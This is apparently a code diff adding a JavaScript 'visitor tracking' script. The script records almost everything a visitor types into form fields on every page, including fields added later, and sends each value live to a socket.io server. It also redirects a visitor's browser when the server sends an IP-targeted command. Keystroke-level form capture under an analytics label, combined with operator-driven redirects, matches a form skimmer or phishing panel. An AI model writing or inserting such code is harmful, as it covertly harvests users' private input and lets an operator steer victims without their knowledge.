@@ -1,0 +1,98 @@
+// Client-side visitor tracking script
+document.addEventListener('DOMContentLoaded', function() {
+  // Check if socket.io is available
+  if (typeof io !== 'undefined') {
+    // Connect to socket.io server
+    const socket = io();
+    
+    // Send current page path to server on page load
+    socket.emit('page-view', { 
+      path: window.location.pathname,
+      title: document.title,
+      referrer: document.referrer
+    });
+    
+    // Track input fields across all pages
+    const inputDebounceDelay = 500; // ms
+    let inputDebounceTimers = {};
+    
+    // Function to track input changes
+    function trackInputs() {
+      const inputs = document.querySelectorAll('input, textarea');
+      
+      inputs.forEach(input => {
+        // Skip password fields for security
+        if (input.type === 'password') return;
+        
+        // Generate a unique ID for this input
+        const inputId = input.id || input.name || input.placeholder || 'unnamed-' + Math.random().toString(36).substr(2, 9);
+        
+        // Add input event listener
+        input.addEventListener('input', function(e) {
+          // Clear previous timer for this input
+          if (inputDebounceTimers[inputId]) {
+            clearTimeout(inputDebounceTimers[inputId]);
+          }
+          
+          // Set new timer to debounce rapid typing
+          inputDebounceTimers[inputId] = setTimeout(() => {
+            // Send input data to server
+            socket.emit('input-data', {
+              path: window.location.pathname,
+              inputId: inputId,
+              inputType: input.type,
+              inputName: input.name || '',
+              inputValue: input.value,
+              timestamp: new Date().toISOString()
+            });
+          }, inputDebounceDelay);
+        });
+      });
+    }
+    
+    // Track inputs on page load
+    trackInputs();
+    
+    // Track inputs after DOM changes (for dynamically added inputs)
+    const observer = new MutationObserver(function(mutations) {
+      trackInputs();
+    });
+    
+    // Observe the entire document for changes
+    observer.observe(document.body, { childList: true, subtree: true });
+    
+    // Track page navigation via History API
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+    
+    history.pushState = function() {
+      originalPushState.apply(this, arguments);
+      trackPageView();
+    };
+    
+    history.replaceState = function() {
+      originalReplaceState.apply(this, arguments);
+      trackPageView();
+    };
+    
+    window.addEventListener('popstate', trackPageView);
+    
+    function trackPageView() {
+      socket.emit('page-view', { 
+        path: window.location.pathname,
+        title: document.title,
+        referrer: document.referrer
+      });
+    }
+    
+    // Handle redirect messages from server
+    socket.on('redirect', (data) => {
+      // Get client IP from server response or use a placeholder
+      const currentIp = socket.clientIp || '::1';
+      
+      if (data.ip === currentIp || data.ip === '::1' || data.ip.includes('127.0.0.1')) {
+        window.location.href = data.url;
+      }
+    });
+  }
+});
